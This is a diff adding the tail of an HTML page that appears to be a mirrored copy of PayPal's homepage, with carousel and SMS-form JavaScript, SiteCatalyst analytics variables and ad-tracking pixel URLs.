+	 <script src="5f548acc92e4c0ae144dff13b31a7616bfebc0.js"></script> 
+
+	<script type="text/javascript">
+		
+			
+
+			$(document).ready( function(){
+				
+				
+
+				var carouselElNoCookie = $('.ppcNoCookie .carouselElement');
+				var carouselCEl = $('.ppcCookie .carouselElement');
+				var nSlides, sWeight;
+				
+				
+					var cookieVar = "Known";
+				
+
+				if((carouselElNoCookie.length < 2) && (carouselCEl.length < 2)){
+						
+				} else {
+
+					if(carouselElNoCookie.length >= 3){ 
+						/*For non-cookied*/
+						nSlides = '4';
+						sWeight = ['25','25','25','25'];
+					} else { 
+						/*cookied*/
+						nSlides = '4';
+						sWeight = ['25','25','25','25'];
+					}
+
+					var carouselVals = {
+						'numSlides':nSlides,
+						'random':false,						
+						'slideWeight':sWeight,
+						'timePerSlide':'6',
+						'imageIteratorClass':'.homepageHero',
+						'slideAnimate':{'transitionIn':'600','transitionOut':'600','opacityIn':'0.7','opacityOut':'1.0'},
+						'hasTracking':'true',
+						'cycleToTrack':1,
+						'cookieCheck':cookieVar
+					};
+					PAYPAL.ppCarousel.initialize(carouselVals);
+				};
+				
+				
+				
+				
+				$(function() {
+					var validPhone = {
+						rules: {
+							mobile_number: {
+								phoneUS: true
+							}
+						},			
+						invalidHandler: function(event, validator) {
+							$("#smsForm .helpError").show();
+						},
+						submitHandler: function() {
+							var $form = $("#smsForm");
+							$form.find('input[type=submit]').addClass('disabled');
+							
+							var ajaxSubmit = $.post($form.attr('action'), $form.serialize(), function(data, textStatus, jqXHR) {
+								$form.hide();
+															
+								/* Switch out form with text */
+								if(textStatus === "success") {
+									$('.sms-sent').removeClass("hide");
+									/* Get phone # */
+									var num = $('#mobile_number').val();
+									$('.sms-sent').append($(' <b>' + num + '</b>'));
+								} else {
+									$('.sms-fail').removeClass("hide");
+								}
+							});
+				
+						}
+						
+					};
+					
+					$("#smsForm").validate(validPhone);		
+					
+				});
+				
+				
+
+				
+				$('#signupForm').formHandler();
+
+
+			});
+		
+			
+	
+	</script>
+	
+
+	
+	
+
+<script type="text/javascript">	
+	
+	PAYPAL.tns.loginflow = '';
+	PAYPAL.tns.flashLocation = 'https://www.paypalobjects.com/en_US/m/midOpt.swf';
+</script>
+
+
+	
+
+
+	
+		
+			<script type="text/javascript" src="pp_jscode_080706.js"></script>
+			<script type="text/javascript">
+				s.pageName="main:mktg:personal::home";
+				s.channel="mktg";
+				s.hier1="main_mktg_personal_";
+				s.eVar31="main:mktg:personal::home";
+				s.eVar25="main:mktg:personal::home:::280";
+				s.prop25="main:mktg:personal::home:::280";
+				s.prop31="personal";
+				s.prop1="home.dust";
+				s.prop20="Unknown";
+				s.prop35="out";
+				s.prop40="2116f2a052018";
+				s.prop30="usa";
+				s.prop50="en_US";
+				s.eVar61="61a49083e476d8c4e83f85a29241ea88";
+				s.eVar62=" ";
+				s.prop62=" ";
+				s.eVar66="||";
+				s.prop71="Sparta";
+				s.prop8="unverified";
+				s.prop9="unrestricted";
+				s.eVar34="bc55e6d967794";
+				s.server="main";
+				s.prop28="Unknown";
+				s.prop36="https://www.paypal.com/webapps/mpp/home";
+				s.eVar71="qe=134,141,152,153,154,159,161,162,164,165,168,172,182,184,185,186,187,192,198,199,200,202,204,205,206,210,214,216,217,218,222,223,225,100,107|qt=161,176,202,221,206,216,219,222,229,231,239,251,274,280,282,284,286,301,314,315,317,321,326,328,330,338,347,*";
+				s.eVar72="uqe=|uqt=|uqc=|xe=184|xt=280";
+				
+				/************ DO NOT ALTER ANYTHING BELOW THIS LINE ! *************/
+				 function scOnload(){
+				 	var s_code=s.t();
+				 	if(s_code)document.write(s_code);
+				 }
+				 
+				 	if (window.addEventListener){
+						window.addEventListener('load',scOnload,false);
+					 } else if (window.attachEvent){
+						window.attachEvent('onload', scOnload);
+					 };
+				 
+				 if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+			 </script>
+			<noscript><img src="../../../../../paypal.112.2o7.net/b/ss/1/H.6--NS/0%3FpageName=NonJavaScript" alt="" height="1" width="1" border="0"></noscript>
+			<!-- DO NOT REMOVE THIS COMMENT -->
+			<!-- End SiteCatalyst Code -->
+		
+	
+
+
+	
+
+
+	
+		
+			
+				
+					<script type="text/javascript" src="pa.js"></script>
+				
+			
+			
+		
+	
+
+
+		   
+		   
+	
+	<div class="hide externalTrackingSrc">https://ads.bluelithium.com/pixel?id=2041741&t=2</div>
+	<div class="hide externalTrackingSrc">https://googleads.g.doubleclick.net/pagead/viewthroughconversion/984570777/?value=0&label=xuVFCJezswQQmbe91QM&guid=ON&script=0</div>
+	
+	<div class="hide externalTrackingSrc">https://secure.adnxs.com/mapuid?member=1961&user=e2a5b2321410a4a1aeb11c31ffc8872f</div>
+	
+	   
+	</body>
+</html>
